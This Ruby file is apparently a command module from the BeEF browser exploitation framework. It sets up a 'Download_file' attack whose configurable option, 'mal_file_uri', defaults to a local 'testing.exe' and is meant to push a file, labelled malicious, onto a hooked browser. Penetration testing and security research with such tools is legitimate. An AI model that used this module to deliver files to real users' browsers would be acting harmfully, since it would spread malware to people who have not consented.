#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Download_file < BeEF::Core::Command
  
  # set and return all options for this module
  def self.options

    configuration = BeEF::Core::Configuration.instance
    proto = configuration.get("beef.http.https.enable") == true ? "https" : "http"

    mal_file_url = "http://127.0.0.1/testing.exe"

    return [{
      'name' => 'mal_file_uri', 
      'description' => 'The web accessible URI for the file.',
      'ui_label' => 'File Path',
      'value' => mal_file_url,
      'width' => '300px' 
      }]
  end

  def post_execute     
    content = {}
    content['result'] = @datastore['result']          
    
    save content   
  end
  
end
